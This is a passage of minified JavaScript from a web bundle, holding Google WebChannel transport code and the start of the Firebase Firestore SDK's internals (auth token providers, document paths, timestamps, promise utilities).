0,x&&x.longPollingTimeout&&x.longPollingTimeout>0&&(this.ia=x.longPollingTimeout),this.ta=void 0,this.T=0,this.P=!1,this.ja=this.B=null}t=dh.prototype,t.ka=8,t.I=1,t.connect=function(x,W,Q,se){wr(0),this.W=x,this.H=W||{},Q&&se!==void 0&&(this.H.OSID=Q,this.H.OAID=se),this.F=this.X,this.J=g5(this,null,this.W),dl(this)};function Rw(x){if(Ey(x),x.I==3){var W=x.V++,Q=Xr(x.J);if(Fn(Q,"SID",x.M),Fn(Q,"RID",W),Fn(Q,"TYPE","terminate"),x0(x,Q),W=new cs(x,x.j,W),W.M=2,W.A=rl(Xr(Q)),Q=!1,o.navigator&&o.navigator.sendBeacon)try{Q=o.navigator.sendBeacon(W.A.toString(),"")}catch{}!Q&&o.Image&&(new Image().src=W.A,Q=!0),Q||(W.g=y5(W.j,null),W.g.ea(W.A)),W.F=Date.now(),Po(W)}m5(x)}function fh(x){x.g&&(Nw(x),x.g.cancel(),x.g=null)}function Ey(x){fh(x),x.v&&(o.clearTimeout(x.v),x.v=null),Ay(x),x.h.cancel(),x.m&&(typeof x.m=="number"&&o.clearTimeout(x.m),x.m=null)}function dl(x){if(!y0(x.h)&&!x.m){x.m=!0;var W=x.Ea;k||I(),O||(k(),O=!0),_.add(W,x),x.D=0}}function _y(x,W){return ac(x.h)>=x.h.j-(x.m?1:0)?!1:x.m?(x.i=W.G.concat(x.i),!0):x.I==1||x.I==2||x.D>=(x.Sa?0:x.Ta)?!1:(x.m=Io(l(x.Ea,x,W),p5(x,x.D)),x.D++,!0)}t.Ea=function(x){if(this.m)if(this.m=null,this.I==1){if(!x){this.V=Math.floor(Math.random()*1e5),x=this.V++;const ve=new cs(this,this.j,x);let Ie=this.o;if(this.U&&(Ie?(Ie=L(Ie),G(Ie,this.U)):Ie=this.U),this.u!==null||this.R||(ve.J=Ie,Ie=null),this.S)e:{for(var W=0,Q=0;Q<this.i.length;Q++){t:{var se=this.i[Q];if("__data__"in se.map&&(se=se.map.__data__,typeof se=="string")){se=se.length;break t}se=void 0}if(se===void 0)break;if(W+=se,W>4096){W=Q;break e}if(W===4096||Q===this.i.length-1){W=Q+1;break e}}W=1e3}else W=1e3;W=l5(this,ve,W),Q=Xr(this.J),Fn(Q,"RID",x),Fn(Q,"CVER",22),this.G&&Fn(Q,"X-HTTP-Session-Id",this.G),x0(this,Q),Ie&&(this.R?W="headers="+va(ko(Ie))+"&"+W:this.u&&fd(Q,this.u,Ie)),b0(this.h,ve),this.Ra&&Fn(Q,"TYPE","init"),this.S?(Fn(Q,"$req",W),Fn(Q,"SID","null"),ve.U=!0,Ds(ve,Q,null)):Ds(ve,Q,W),this.I=2}}else this.I==3&&(x?Pw(this,x):this.i.length==0||y0(this.h)||Pw(this))};function Pw(x,W){var Q;W?Q=W.l:Q=x.V++;const se=Xr(x.J);Fn(se,"SID",x.M),Fn(se,"RID",Q),Fn(se,"AID",x.K),x0(x,se),x.u&&x.o&&fd(se,x.u,x.o),Q=new cs(x,x.j,Q,x.D+1),x.u===null&&(Q.J=x.o),W&&(x.i=W.G.concat(x.i)),W=l5(x,Q,1e3),Q.H=Math.round(x.va*.5)+Math.round(x.va*.5*Math.random()),b0(x.h,Q),Ds(Q,se,W)}function x0(x,W){x.H&&$(x.H,function(Q,se){Fn(W,se,Q)}),x.l&&$({},function(Q,se){Fn(W,se,Q)})}function l5(x,W,Q){Q=Math.min(x.i.length,Q);const se=x.l?l(x.l.Ka,x.l,x):null;e:{var ve=x.i;let Zt=-1;for(;;){const li=["count="+Q];Zt==-1?Q>0?(Zt=ve[0].g,li.push("ofs="+Zt)):Zt=0:li.push("ofs="+Zt);let $n=!0;for(let Dr=0;Dr<Q;Dr++){var Ie=ve[Dr].g;const dc=ve[Dr].map;if(Ie-=Zt,Ie<0)Zt=Math.max(0,ve[Dr].g-100),$n=!1;else try{Ie="req"+Ie+"_"||"";try{var Je=dc instanceof Map?dc:Object.entries(dc);for(const[hl,ou]of Je){let au=ou;a(ou)&&(au=dt(ou)),li.push(Ie+hl+"="+encodeURIComponent(au))}}catch(hl){throw li.push(Ie+"type="+encodeURIComponent("_badmap")),hl}}catch{se&&se(dc)}}if($n){Je=li.join("&");break e}}Je=void 0}return x=x.i.splice(0,Q),W.G=x,Je}function d5(x){if(!x.g&&!x.v){x.Y=1;var W=x.Da;k||I(),O||(k(),O=!0),_.add(W,x),x.A=0}}function I0(x){return x.g||x.v||x.A>=3?!1:(x.Y++,x.v=Io(l(x.Da,x),p5(x,x.A)),x.A++,!0)}t.Da=function(){if(this.v=null,f5(this),this.aa&&!(this.P||this.g==null||this.T<=0)){var x=4*this.T;this.j.info("BP detection timer enabled: "+x),this.B=Io(l(this.Wa,this),x)}},t.Wa=function(){this.B&&(this.B=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.P=!0,wr(10),fh(this),f5(this))};function Nw(x){x.B!=null&&(o.clearTimeout(x.B),x.B=null)}function f5(x){x.g=new cs(x,x.j,"rpc",x.Y),x.u===null&&(x.g.J=x.o),x.g.P=0;var W=Xr(x.na);Fn(W,"RID","rpc"),Fn(W,"SID",x.M),Fn(W,"AID",x.K),Fn(W,"CI",x.F?"0":"1"),!x.F&&x.ia&&Fn(W,"TO",x.ia),Fn(W,"TYPE","xmlhttp"),x0(x,W),x.u&&x.o&&fd(W,x.u,x.o),x.O&&(x.g.H=x.O);var Q=x.g;x=x.ba,Q.M=1,Q.A=rl(Xr(W)),Q.u=null,Q.R=!0,nu(Q,x)}t.Va=function(){this.C!=null&&(this.C=null,fh(this),I0(this),wr(19))};function Ay(x){x.C!=null&&(o.clearTimeout(x.C),x.C=null)}function h5(x,W){var Q=null;if(x.g==W){Ay(x),Nw(x),x.g=null;var se=2}else if(Ea(x.h,W))Q=W.G,w0(x.h,W),se=1;else return;if(x.I!=0){if(W.o)if(se==1){Q=W.u?W.u.length:0,W=Date.now()-W.F;var ve=x.D;se=Xc(),ze(se,new xo(se,Q)),dl(x)}else d5(x);else if(ve=W.m,ve==3||ve==0&&W.X>0||!(se==1&&_y(x,W)||se==2&&I0(x)))switch(Q&&Q.length>0&&(W=x.h,W.i=W.i.concat(Q)),ve){case 1:fl(x,5);break;case 4:fl(x,10);break;case 3:fl(x,6);break;default:fl(x,2)}}}function p5(x,W){let Q=x.Qa+Math.floor(Math.random()*x.Za);return x.isActive()||(Q*=2),Q*W}function fl(x,W){if(x.j.info("Error code "+W),W==2){var Q=l(x.bb,x),se=x.Ua;const ve=!se;se=new ls(se||"//www.google.com/images/cleardot.gif"),o.location&&o.location.protocol=="http"||Ei(se,"https"),rl(se),ve?_a(se.toString(),Q):C0(se.toString(),Q)}else wr(2);x.I=0,x.l&&x.l.pa(W),m5(x),Ey(x)}t.bb=function(x){x?(this.j.info("Successfully pinged google.com"),wr(2)):(this.j.info("Failed to ping google.com"),wr(1))};function m5(x){if(x.I=0,x.ja=[],x.l){const W=v0(x.h);(W.length!=0||x.i.length!=0)&&(w(x.ja,W),w(x.ja,x.i),x.h.i.length=0,b(x.i),x.i.length=0),x.l.oa()}}function g5(x,W,Q){var se=Q instanceof ls?Xr(Q):new ls(Q);if(se.g!="")W&&(se.g=W+"."+se.g),ru(se,se.u);else{var ve=o.location;se=ve.protocol,W=W?W+"."+ve.hostname:ve.hostname,ve=+ve.port;const Ie=new ls(null);se&&Ei(Ie,se),W&&(Ie.g=W),ve&&ru(Ie,ve),Q&&(Ie.h=Q),se=Ie}return Q=x.G,W=x.wa,Q&&W&&Fn(se,Q,W),Fn(se,"VER",x.ka),x0(x,se),se}function y5(x,W,Q){if(W&&!x.L)throw Error("Can't create secondary domain capable XhrIo object.");return W=x.Aa&&!x.ma?new Wn(new uc({ab:Q})):new Wn(x.ma),W.Fa(x.L),W}t.isActive=function(){return!!this.l&&this.l.isActive(this)};function b5(){}t=b5.prototype,t.ra=function(){},t.qa=function(){},t.pa=function(){},t.oa=function(){},t.isActive=function(){return!0},t.Ka=function(){};function hh(){}hh.prototype.g=function(x,W){return new ro(x,W)};function ro(x,W){Et.call(this),this.g=new dh(W),this.l=x,this.h=W&&W.messageUrlParams||null,x=W&&W.messageHeaders||null,W&&W.clientProtocolHeaderRequired&&(x?x["X-Client-Protocol"]="webchannel":x={"X-Client-Protocol":"webchannel"}),this.g.o=x,x=W&&W.initMessageHeaders||null,W&&W.messageContentType&&(x?x["X-WebChannel-Content-Type"]=W.messageContentType:x={"X-WebChannel-Content-Type":W.messageContentType}),W&&W.sa&&(x?x["X-WebChannel-Client-Profile"]=W.sa:x={"X-WebChannel-Client-Profile":W.sa}),this.g.U=x,(x=W&&W.Qb)&&!N(x)&&(this.g.u=x),this.A=W&&W.supportsCrossDomainXhr||!1,this.v=W&&W.sendRawJson||!1,(W=W&&W.httpSessionIdParam)&&!N(W)&&(this.g.G=W,x=this.h,x!==null&&W in x&&(x=this.h,W in x&&delete x[W])),this.j=new md(this)}h(ro,Et),ro.prototype.m=function(){this.g.l=this.j,this.A&&(this.g.L=!0),this.g.connect(this.l,this.h||void 0)},ro.prototype.close=function(){Rw(this.g)},ro.prototype.o=function(x){var W=this.g;if(typeof x=="string"){var Q={};Q.__data__=x,x=Q}else this.v&&(Q={},Q.__data__=dt(x),x=Q);W.i.push(new zr(W.Ya++,x)),W.I==3&&dl(W)},ro.prototype.N=function(){this.g.l=null,delete this.j,Rw(this.g),delete this.g,ro.Z.N.call(this)};function w5(x){xr.call(this),x.__headers__&&(this.headers=x.__headers__,this.statusCode=x.__status__,delete x.__headers__,delete x.__status__);var W=x.__sm__;if(W){e:{for(const Q in W){x=Q;break e}x=void 0}(this.i=x)&&(x=this.i,W=W!==null&&x in W?W[x]:void 0),this.data=W}else this.data=x}h(w5,xr);function v5(){Vi.call(this),this.status=1}h(v5,Vi);function md(x){this.g=x}h(md,b5),md.prototype.ra=function(){ze(this.g,"a")},md.prototype.qa=function(x){ze(this.g,new w5(x))},md.prototype.pa=function(x){ze(this.g,new v5)},md.prototype.oa=function(){ze(this.g,"b")},hh.prototype.createWebChannel=hh.prototype.g,ro.prototype.send=ro.prototype.o,ro.prototype.open=ro.prototype.m,ro.prototype.close=ro.prototype.close,Qde=function(){return new hh},Yde=function(){return Xc()},Zde=br,OD={jb:0,mb:1,nb:2,Hb:3,Mb:4,Jb:5,Kb:6,Ib:7,Gb:8,Lb:9,PROXY:10,NOPROXY:11,Eb:12,Ab:13,Bb:14,zb:15,Cb:16,Db:17,fb:18,eb:19,gb:20},tu.NO_ERROR=0,tu.TIMEOUT=8,tu.HTTP_ERROR=6,ex=tu,ya.COMPLETE="complete",Kde=ya,eo.EventType=Hr,Hr.OPEN="a",Hr.CLOSE="b",Hr.ERROR="c",Hr.MESSAGE="d",Et.prototype.listen=Et.prototype.J,J2=eo,Wn.prototype.listenOnce=Wn.prototype.K,Wn.prototype.getLastError=Wn.prototype.Ha,Wn.prototype.getLastErrorCode=Wn.prototype.ya,Wn.prototype.getStatus=Wn.prototype.ca,Wn.prototype.getResponseJson=Wn.prototype.La,Wn.prototype.getResponseText=Wn.prototype.la,Wn.prototype.send=Wn.prototype.ea,Wn.prototype.setWithCredentials=Wn.prototype.Fa,Gde=Wn}).apply(typeof RT<"u"?RT:typeof self<"u"?self:typeof window<"u"?window:{});const hne="@firebase/firestore",pne="4.9.2";class Ws{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}Ws.UNAUTHENTICATED=new Ws(null),Ws.GOOGLE_CREDENTIALS=new Ws("google-credentials-uid"),Ws.FIRST_PARTY=new Ws("first-party-uid"),Ws.MOCK_USER=new Ws("mock-user");let _w="12.3.0";const Dg=new Fde("@firebase/firestore");function Ub(){return Dg.logLevel}function mt(t,...e){if(Dg.logLevel<=Tn.DEBUG){const n=e.map(FM);Dg.debug(`Firestore (${_w}): ${t}`,...n)}}function zf(t,...e){if(Dg.logLevel<=Tn.ERROR){const n=e.map(FM);Dg.error(`Firestore (${_w}): ${t}`,...n)}}function Z1(t,...e){if(Dg.logLevel<=Tn.WARN){const n=e.map(FM);Dg.warn(`Firestore (${_w}): ${t}`,...n)}}function FM(t){if(typeof t=="string")return t;try{return(function(n){return JSON.stringify(n)})(t)}catch{return t}}function Ft(t,e,n){let r="Unexpected state";typeof e=="string"?r=e:n=e,Jde(t,r,n)}function Jde(t,e,n){let r=`FIRESTORE (${_w}) INTERNAL ASSERTION FAILED: ${e} (ID: ${t.toString(16)})`;if(n!==void 0)try{r+=" CONTEXT: "+JSON.stringify(n)}catch{r+=" CONTEXT: "+n}throw zf(r),new Error(r)}function Kn(t,e,n,r){let i="Unexpected state";typeof n=="string"?i=n:r=n,t||Jde(e,i,r)}function Gt(t,e){return t}const Fe={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class ut extends Ew{constructor(e,n){super(e,n),this.code=e,this.message=n,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}class Cp{constructor(){this.promise=new Promise(((e,n)=>{this.resolve=e,this.reject=n}))}}class Xde{constructor(e,n){this.user=n,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class Yqe{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,n){e.enqueueRetryable((()=>n(Ws.UNAUTHENTICATED)))}shutdown(){}}class Qqe{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,n){this.changeListener=n,e.enqueueRetryable((()=>n(this.token.user)))}shutdown(){this.changeListener=null}}class Jqe{constructor(e){this.t=e,this.currentUser=Ws.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,n){Kn(this.o===void 0,42304);let r=this.i;const i=c=>this.i!==r?(r=this.i,n(c)):Promise.resolve();let s=new Cp;this.o=()=>{this.i++,this.currentUser=this.u(),s.resolve(),s=new Cp,e.enqueueRetryable((()=>i(this.currentUser)))};const o=()=>{const c=s;e.enqueueRetryable((async()=>{await c.promise,await i(this.currentUser)}))},a=c=>{mt("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=c,this.o&&(this.auth.addAuthTokenListener(this.o),o())};this.t.onInit((c=>a(c))),setTimeout((()=>{if(!this.auth){const c=this.t.getImmediate({optional:!0});c?a(c):(mt("FirebaseAuthCredentialsProvider","Auth not yet detected"),s.resolve(),s=new Cp)}}),0),o()}getToken(){const e=this.i,n=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(n).then((r=>this.i!==e?(mt("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):r?(Kn(typeof r.accessToken=="string",31837,{l:r}),new Xde(r.accessToken,this.currentUser)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return Kn(e===null||typeof e=="string",2055,{h:e}),new Ws(e)}}class Xqe{constructor(e,n,r){this.P=e,this.T=n,this.I=r,this.type="FirstParty",this.user=Ws.FIRST_PARTY,this.A=new Map}R(){return this.I?this.I():null}get headers(){this.A.set("X-Goog-AuthUser",this.P);const e=this.R();return e&&this.A.set("Authorization",e),this.T&&this.A.set("X-Goog-Iam-Authorization-Token",this.T),this.A}}class eVe{constructor(e,n,r){this.P=e,this.T=n,this.I=r}getToken(){return Promise.resolve(new Xqe(this.P,this.T,this.I))}start(e,n){e.enqueueRetryable((()=>n(Ws.FIRST_PARTY)))}shutdown(){}invalidateToken(){}}class mne{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class tVe{constructor(e,n){this.V=n,this.forceRefresh=!1,this.appCheck=null,this.m=null,this.p=null,Bqe(e)&&e.settings.appCheckToken&&(this.p=e.settings.appCheckToken)}start(e,n){Kn(this.o===void 0,3512);const r=s=>{s.error!=null&&mt("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${s.error.message}`);const o=s.token!==this.m;return this.m=s.token,mt("FirebaseAppCheckTokenProvider",`Received ${o?"new":"existing"} token.`),o?n(s.token):Promise.resolve()};this.o=s=>{e.enqueueRetryable((()=>r(s)))};const i=s=>{mt("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=s,this.o&&this.appCheck.addTokenListener(this.o)};this.V.onInit((s=>i(s))),setTimeout((()=>{if(!this.appCheck){const s=this.V.getImmediate({optional:!0});s?i(s):mt("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}}),0)}getToken(){if(this.p)return Promise.resolve(new mne(this.p));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then((n=>n?(Kn(typeof n.token=="string",44558,{tokenResult:n}),this.m=n.token,new mne(n.token)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}function nVe(t){const e=typeof self<"u"&&(self.crypto||self.msCrypto),n=new Uint8Array(t);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(n);else for(let r=0;r<t;r++)n[r]=Math.floor(256*Math.random());return n}class $M{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=62*Math.floor(4.129032258064516);let r="";for(;r.length<20;){const i=nVe(40);for(let s=0;s<i.length;++s)r.length<20&&i[s]<n&&(r+=e.charAt(i[s]%62))}return r}}function pn(t,e){return t<e?-1:t>e?1:0}function kD(t,e){const n=Math.min(t.length,e.length);for(let r=0;r<n;r++){const i=t.charAt(r),s=e.charAt(r);if(i!==s)return vk(i)===vk(s)?pn(i,s):vk(i)?1:-1}return pn(t.length,e.length)}const rVe=55296,iVe=57343;function vk(t){const e=t.charCodeAt(0);return e>=rVe&&e<=iVe}function Y1(t,e,n){return t.length===e.length&&t.every(((r,i)=>n(r,e[i])))}const gne="__name__";class Pl{constructor(e,n,r){n===void 0?n=0:n>e.length&&Ft(637,{offset:n,range:e.length}),r===void 0?r=e.length-n:r>e.length-n&&Ft(1746,{length:r,range:e.length-n}),this.segments=e,this.offset=n,this.len=r}get length(){return this.len}isEqual(e){return Pl.comparator(this,e)===0}child(e){const n=this.segments.slice(this.offset,this.limit());return e instanceof Pl?e.forEach((r=>{n.push(r)})):n.push(e),this.construct(n)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let n=0;n<this.length;n++)if(this.get(n)!==e.get(n))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let n=0;n<this.length;n++)if(this.get(n)!==e.get(n))return!1;return!0}forEach(e){for(let n=this.offset,r=this.limit();n<r;n++)e(this.segments[n])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,n){const r=Math.min(e.length,n.length);for(let i=0;i<r;i++){const s=Pl.compareSegments(e.get(i),n.get(i));if(s!==0)return s}return pn(e.length,n.length)}static compareSegments(e,n){const r=Pl.isNumericId(e),i=Pl.isNumericId(n);return r&&!i?-1:!r&&i?1:r&&i?Pl.extractNumericId(e).compare(Pl.extractNumericId(n)):kD(e,n)}static isNumericId(e){return e.startsWith("__id")&&e.endsWith("__")}static extractNumericId(e){return Ap.fromString(e.substring(4,e.length-2))}}class Sr extends Pl{construct(e,n,r){return new Sr(e,n,r)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const n=[];for(const r of e){if(r.indexOf("//")>=0)throw new ut(Fe.INVALID_ARGUMENT,`Invalid segment (${r}). Paths must not contain // in them.`);n.push(...r.split("/").filter((i=>i.length>0)))}return new Sr(n)}static emptyPath(){return new Sr([])}}const sVe=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class Ts extends Pl{construct(e,n,r){return new Ts(e,n,r)}static isValidIdentifier(e){return sVe.test(e)}canonicalString(){return this.toArray().map((e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),Ts.isValidIdentifier(e)||(e="`"+e+"`"),e))).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)===gne}static keyField(){return new Ts([gne])}static fromServerFormat(e){const n=[];let r="",i=0;const s=()=>{if(r.length===0)throw new ut(Fe.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);n.push(r),r=""};let o=!1;for(;i<e.length;){const a=e[i];if(a==="\\"){if(i+1===e.length)throw new ut(Fe.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const c=e[i+1];if(c!=="\\"&&c!=="."&&c!=="`")throw new ut(Fe.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);r+=c,i+=2}else a==="`"?(o=!o,i++):a!=="."||o?(r+=a,i++):(s(),i++)}if(s(),o)throw new ut(Fe.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new Ts(n)}static emptyPath(){return new Ts([])}}class Pt{constructor(e){this.path=e}static fromPath(e){return new Pt(Sr.fromString(e))}static fromName(e){return new Pt(Sr.fromString(e).popFirst(5))}static empty(){return new Pt(Sr.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&Sr.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,n){return Sr.comparator(e.path,n.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Pt(new Sr(e.slice()))}}function efe(t,e,n){if(!n)throw new ut(Fe.INVALID_ARGUMENT,`Function ${t}() cannot be called with an empty ${e}.`)}function oVe(t,e,n,r){if(e===!0&&r===!0)throw new ut(Fe.INVALID_ARGUMENT,`${t} and ${n} cannot be used together.`)}function yne(t){if(!Pt.isDocumentKey(t))throw new ut(Fe.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${t} has ${t.length}.`)}function bne(t){if(Pt.isDocumentKey(t))throw new ut(Fe.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${t} has ${t.length}.`)}function tfe(t){return typeof t=="object"&&t!==null&&(Object.getPrototypeOf(t)===Object.prototype||Object.getPrototypeOf(t)===null)}function lR(t){if(t===void 0)return"undefined";if(t===null)return"null";if(typeof t=="string")return t.length>20&&(t=`${t.substring(0,20)}...`),JSON.stringify(t);if(typeof t=="number"||typeof t=="boolean")return""+t;if(typeof t=="object"){if(t instanceof Array)return"an array";{const e=(function(r){return r.constructor?r.constructor.name:null})(t);return e?`a custom ${e} object`:"an object"}}return typeof t=="function"?"a function":Ft(12329,{type:typeof t})}function Sp(t,e){if("_delegate"in t&&(t=t._delegate),!(t instanceof e)){if(e.name===t.constructor.name)throw new ut(Fe.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const n=lR(t);throw new ut(Fe.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${n}`)}}return t}function Bi(t,e){const n={typeString:t};return e&&(n.value=e),n}function r5(t,e){if(!tfe(t))throw new ut(Fe.INVALID_ARGUMENT,"JSON must be an object");let n;for(const r in e)if(e[r]){const i=e[r].typeString,s="value"in e[r]?{value:e[r].value}:void 0;if(!(r in t)){n=`JSON missing required field: '${r}'`;break}const o=t[r];if(i&&typeof o!==i){n=`JSON field '${r}' must be a ${i}.`;break}if(s!==void 0&&o!==s.value){n=`Expected '${r}' field to equal '${s.value}'`;break}}if(n)throw new ut(Fe.INVALID_ARGUMENT,n);return!0}const wne=-62135596800,vne=1e6;class kr{static now(){return kr.fromMillis(Date.now())}static fromDate(e){return kr.fromMillis(e.getTime())}static fromMillis(e){const n=Math.floor(e/1e3),r=Math.floor((e-1e3*n)*vne);return new kr(n,r)}constructor(e,n){if(this.seconds=e,this.nanoseconds=n,n<0)throw new ut(Fe.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+n);if(n>=1e9)throw new ut(Fe.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+n);if(e<wne)throw new ut(Fe.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new ut(Fe.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/vne}_compareTo(e){return this.seconds===e.seconds?pn(this.nanoseconds,e.nanoseconds):pn(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{type:kr._jsonSchemaVersion,seconds:this.seconds,nanoseconds:this.nanoseconds}}static fromJSON(e){if(r5(e,kr._jsonSchema))return new kr(e.seconds,e.nanoseconds)}valueOf(){const e=this.seconds-wne;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}kr._jsonSchemaVersion="firestore/timestamp/1.0",kr._jsonSchema={type:Bi("string",kr._jsonSchemaVersion),seconds:Bi("number"),nanoseconds:Bi("number")};class qt{static fromTimestamp(e){return new qt(e)}static min(){return new qt(new kr(0,0))}static max(){return new qt(new kr(253402300799,999999999))}constructor(e){this.timestamp=e}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}const j_=-1;function aVe(t,e){const n=t.toTimestamp().seconds,r=t.toTimestamp().nanoseconds+1,i=qt.fromTimestamp(r===1e9?new kr(n+1,0):new kr(n,r));return new Fp(i,Pt.empty(),e)}function cVe(t){return new Fp(t.readTime,t.key,j_)}class Fp{constructor(e,n,r){this.readTime=e,this.documentKey=n,this.largestBatchId=r}static min(){return new Fp(qt.min(),Pt.empty(),j_)}static max(){return new Fp(qt.max(),Pt.empty(),j_)}}function uVe(t,e){let n=t.readTime.compareTo(e.readTime);return n!==0?n:(n=Pt.comparator(t.documentKey,e.documentKey),n!==0?n:pn(t.largestBatchId,e.largestBatchId))}const lVe="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class dVe{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach((e=>e()))}}async function Aw(t){if(t.code!==Fe.FAILED_PRECONDITION||t.message!==lVe)throw t;mt("LocalStore","Unexpectedly lost primary lease")}class He{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e((n=>{this.isDone=!0,this.result=n,this.nextCallback&&this.nextCallback(n)}),(n=>{this.isDone=!0,this.error=n,this.catchCallback&&this.catchCallback(n)}))}catch(e){return this.next(void 0,e)}next(e,n){return this.callbackAttached&&Ft(59440),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(n,this.error):this.wrapSuccess(e,this.result):new He(((r,i)=>{this.nextCallback=s=>{this.wrapSuccess(e,s).next(r,i)},this.catchCallback=s=>{this.wrapFailure(n,s).next(r,i)}}))}toPromise(){return new Promise(((e,n)=>{this.next(e,n)}))}wrapUserFunction(e){try{const n=e();return n instanceof He?n:He.resolve(n)}catch(n){return He.reject(n)}}wrapSuccess(e,n){return e?this.wrapUserFunction((()=>e(n))):He.resolve(n)}wrapFailure(e,n){return e?this.wrapUserFunction((()=>e(n))):He.reject(n)}static resolve(e){return new He(((n,r)=>{n(e)}))}static reject(e){return new He(((n,r)=>{r(e)}))}static waitFor(e){return new He(((n,r)=>{let i=0,s=0,o=!1;e.forEach((a=>{++i,a.next((()=>{++s,o&&s===i&&n()}),(c=>r(c)))})),o=!0,s===i&&n()}))}static or(e){let n=He.resolve(!1);for(const r of e)n=n.next((i=>i?He.resolve(i):r()));return n}static forEach(e,n){const r=[];return e.forEach(((i,s)=>{r.push(n.call(this,i,s))})),this.waitFor(r)}static mapArray(e,n){return new He(((r,i)=>{const s=e.length,o=new Array(s);let a=0;for(let c=0;c<s;c++){const l=c;n(e[l]).next((f=>{o[l]=f,++a,a===s&&r(o)}),(f=>i(f)))}}))}static doWhile(e,n){return new He(((r,i)=>{const s=()=>{e()===!0?n().next((()=>{s()}),i):r()};s()}))}}function fVe(t){const e=t.match(/Android ([\d.]+)/i),n=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(n)}function Cw(t){return t.name==="IndexedDbTransactionError"}class 